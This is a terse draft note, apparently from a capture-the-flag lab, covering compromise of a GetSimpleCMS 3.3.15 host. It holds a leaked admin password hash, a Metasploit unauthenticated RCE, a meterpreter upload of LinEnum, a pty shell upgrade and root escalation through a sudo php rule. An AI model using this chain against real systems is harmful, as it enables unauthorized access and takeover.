---
title: Example Title
draft: true
tags:
  - example-tag
date:
---
```
<item>
    <USR>admin</USR>
    <NAME/>
    <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
    <EMAIL>admin@gettingstarted.com</EMAIL>
    <HTMLEDITOR>1</HTMLEDITOR>
    <TIMEZONE/>
    <LANG>en_US</LANG>
</item>

http://10.129.215.229/data/cache/2a4c6447379fba09620ba05582eb61af.txt
{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}

msf > search 3.3.15

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE


meterpreter > cat user.txt
abb00717$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
meterpreter > upload LinEnum.sh
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@gettingstarted:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
www-data@gettingstarted:/$ sudo /usr/bin/php -r "system('/bin/bash');"
```